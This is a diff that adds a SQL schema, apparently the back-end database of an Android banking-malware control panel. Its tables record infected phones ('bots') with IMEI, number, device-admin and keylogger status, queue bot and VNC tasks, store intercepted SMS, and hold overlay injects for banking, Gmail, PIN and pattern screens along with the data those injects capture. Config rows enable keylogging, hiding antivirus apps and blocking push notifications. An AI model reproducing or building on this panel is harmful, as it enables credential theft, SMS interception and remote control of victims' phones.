@@ -1,0 +1,199 @@
+
+CREATE TABLE `bots` (
+  `id` int(11) NOT NULL,
+  `bot_id` varchar(36) NOT NULL,
+  `imei` varchar(50) NOT NULL DEFAULT '',
+  `number` varchar(15) NOT NULL DEFAULT '',
+  `is_device_admin` tinyint(1) NOT NULL DEFAULT 0,
+  `is_sms_admin` tinyint(1) NOT NULL DEFAULT 0,
+  `is_locked` tinyint(1) NOT NULL DEFAULT 0,
+  `registered` timestamp NOT NULL DEFAULT current_timestamp(),
+  `last_seen` timestamp NOT NULL DEFAULT current_timestamp(),
+  `ip` varchar(512) NOT NULL,
+  `country` char(2) NOT NULL DEFAULT '',
+  `lang` varchar(5) NOT NULL DEFAULT '',
+  `android` varchar(64) NOT NULL DEFAULT '',
+  `model` varchar(200) NOT NULL DEFAULT '',
+  `operator` varchar(20) NOT NULL DEFAULT '',
+  `tag` varchar(32) NOT NULL DEFAULT '',
+  `comment` varchar(512) DEFAULT NULL,
+  `apps` text NOT NULL,
+  `is_loader_installed` tinyint(1) NOT NULL DEFAULT 0,
+  `extra_info_json` varchar(1024) NOT NULL DEFAULT '',
+  `uptime` bigint(20) NOT NULL,
+  `keylogger` tinyint(1) NOT NULL DEFAULT 0,
+  `vnc` varchar(128) NOT NULL DEFAULT '',
+  `is_fg` tinyint(1) NOT NULL DEFAULT 0
+) ENGINE=InnoDB DEFAULT CHARSET=utf8;
+
+CREATE TABLE `bots_tasks` (
+  `id` int(11) NOT NULL,
+  `bot_id` varchar(36) NOT NULL,
+  `task_type` varchar(20) NOT NULL,
+  `data` varchar(256) NOT NULL,
+  `status` varchar(64) NOT NULL
+) ENGINE=InnoDB DEFAULT CHARSET=utf8;
+
+CREATE TABLE `config` (
+  `id` int(11) NOT NULL,
+  `name` varchar(128) NOT NULL,
+  `value` mediumtext NOT NULL,
+  `descr` varchar(256) NOT NULL DEFAULT '',
+  `placeholder` varchar(128) NOT NULL DEFAULT ''
+) ENGINE=InnoDB DEFAULT CHARSET=utf8;
+
+INSERT INTO `config` (`id`, `name`, `value`, `descr`, `placeholder`) VALUES
+(1, 'domains_bot', '', '', 'domain1.com|domain2.eu|dom3.gb'),
+(2, 'desired_apps', 'com.bbva.bbvacontigo\ncom.android.chrome', '', ''),
+(3, 'view_mode', 'night', '', ''),
+(4, 'block_push_apps', '%FILE_push_blocked_list.txt%', 'Apps with blocked push notifications', 'com.package1,com.package2,...'),
+(6, 'minimize_apps', '%FILE_avs_list.txt%', '', ''),
+(7, 'uninstall_apps', '', '', ''),
+(8, 'block_push_delay', '0', '', ''),
+(9, 'minimize_delay', '0', '', ''),
+(10, 'uninstall_delay', '120', '', ''),
+(11, 'keylogger_delay', '0', '', ''),
+(12, 'injects_delay', '120', '', ''),
+(13, 'keylogger_enabled', '1', '', ''),
+(14, 'net_delay', '60', '', ''),
+(16, 'get_device_admin_delay', '0', '', ''),
+(17, 'smarts_ver', '0', 'Timestamp of last injects update', '');
+
+CREATE TABLE `errors` (
+  `id` int(11) NOT NULL,
+  `bot_id` varchar(36) NOT NULL,
+  `time` timestamp NOT NULL DEFAULT current_timestamp(),
+  `msg` text NOT NULL
+) ENGINE=InnoDB DEFAULT CHARSET=utf8;
+
+CREATE TABLE `pushes_bots` (
+  `id` int(11) NOT NULL,
+  `bot_id` varchar(36) NOT NULL,
+  `pkg` varchar(128) NOT NULL,
+  `enabled` tinyint(4) NOT NULL
+) ENGINE=InnoDB DEFAULT CHARSET=utf8;
+
+CREATE TABLE `smarts` (
+  `id` int(11) NOT NULL,
+  `stype` varchar(4) NOT NULL COMMENT 'html,url',
+  `sgroup` varchar(128) NOT NULL COMMENT 'de,es,crypto,emails',
+  `package` varchar(128) NOT NULL COMMENT 'com.pkg,gmail,pattern',
+  `data` longtext NOT NULL COMMENT 'html body, url address',
+  `cap_data` longtext NOT NULL COMMENT 'html body for filled',
+  `icon` mediumblob NOT NULL DEFAULT '' COMMENT 'icon png binary',
+  `is_active` tinyint(1) NOT NULL COMMENT 'enabled and filled'
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
+
+INSERT INTO `smarts` (`id`, `stype`, `sgroup`, `package`, `data`, `cap_data`, `icon`, `is_active`) VALUES
+(1, 'html', 'specials', 'gmail', '%FILE_gmail.html%', '', '', 1);
+INSERT INTO `smarts` (`id`, `stype`, `sgroup`, `package`, `data`, `cap_data`, `icon`, `is_active`) VALUES
+(2, 'html', 'specials', 'pattern', '%FILE_pattern.html%', '', '', 1);
+INSERT INTO `smarts` (`id`, `stype`, `sgroup`, `package`, `data`, `cap_data`, `icon`, `is_active`) VALUES
+(3, 'html', 'specials', 'pin', '%FILE_pin.html%', '', '', 1);
+
+CREATE TABLE `smarts_bots` (
+  `id` int(11) NOT NULL,
+  `smart_id` int(11) NOT NULL,
+  `bot_id` varchar(36) NOT NULL,
+  `is_active` tinyint(1) NOT NULL
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
+
+CREATE TABLE `smarts_data` (
+  `id` int(11) NOT NULL,
+  `smart_id` int(11) NOT NULL,
+  `bot_id` varchar(36) NOT NULL,
+  `time` varchar(20) NOT NULL,
+  `data` text NOT NULL
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
+
+CREATE INDEX bot_id ON smarts_data(bot_id);
+CREATE INDEX fields ON smarts_data(smart_id, id);
+
+CREATE TABLE `sms` (
+  `id` int(11) NOT NULL,
+  `bot_id` varchar(36) NOT NULL,
+  `number` varchar(20) NOT NULL,
+  `time` varchar(20) NOT NULL,
+  `msg` text NOT NULL
+) ENGINE=InnoDB DEFAULT CHARSET=utf8;
+
+CREATE INDEX bot_id ON sms(bot_id);
+
+CREATE TABLE `vnc_tasks` (
+  `id` int(11) NOT NULL,
+  `bot_id` varchar(36) NOT NULL,
+  `task_type` varchar(32) NOT NULL,
+  `data` varchar(128) NOT NULL
+) ENGINE=InnoDB DEFAULT CHARSET=utf8;
+
+
+ALTER TABLE `bots`
+  ADD PRIMARY KEY (`id`),
+  ADD UNIQUE KEY `api` (`tag`,`registered`,`android`,`country`),
+  ADD UNIQUE KEY `bot_id` (`bot_id`);
+
+ALTER TABLE `bots_tasks`
+  ADD PRIMARY KEY (`id`),
+  ADD UNIQUE KEY `id_bot_id_status` (`id`,`bot_id`,`status`);
+
+ALTER TABLE `config`
+  ADD PRIMARY KEY (`id`),
+  ADD UNIQUE KEY `name` (`name`);
+
+ALTER TABLE `errors`
+  ADD PRIMARY KEY (`id`);
+
+ALTER TABLE `pushes_bots`
+  ADD PRIMARY KEY (`id`),
+  ADD UNIQUE KEY `bot_id_pkg` (`bot_id`,`pkg`);
+
+ALTER TABLE `smarts`
+  ADD PRIMARY KEY (`id`),
+  ADD UNIQUE KEY `pkg_unq` (`package`);
+
+ALTER TABLE `smarts_bots`
+  ADD PRIMARY KEY (`id`),
+  ADD UNIQUE KEY `smartid_botid_unq` (`smart_id`,`bot_id`);
+
+ALTER TABLE `smarts_data`
+  ADD PRIMARY KEY (`id`);
+
+ALTER TABLE `sms`
+  ADD PRIMARY KEY (`id`),
+  ADD UNIQUE KEY `bot_id_time` (`bot_id`,`time`);
+
+ALTER TABLE `vnc_tasks`
+  ADD PRIMARY KEY (`id`);
+
+
+ALTER TABLE `bots`
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
+
+ALTER TABLE `bots_tasks`
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
+
+ALTER TABLE `config`
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
+
+ALTER TABLE `errors`
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
+
+ALTER TABLE `pushes_bots`
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
+
+ALTER TABLE `smarts`
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
+
+ALTER TABLE `smarts_bots`
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
+
+ALTER TABLE `smarts_data`
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
+
+ALTER TABLE `sms`
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
+
+ALTER TABLE `vnc_tasks`
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
+COMMIT;
+
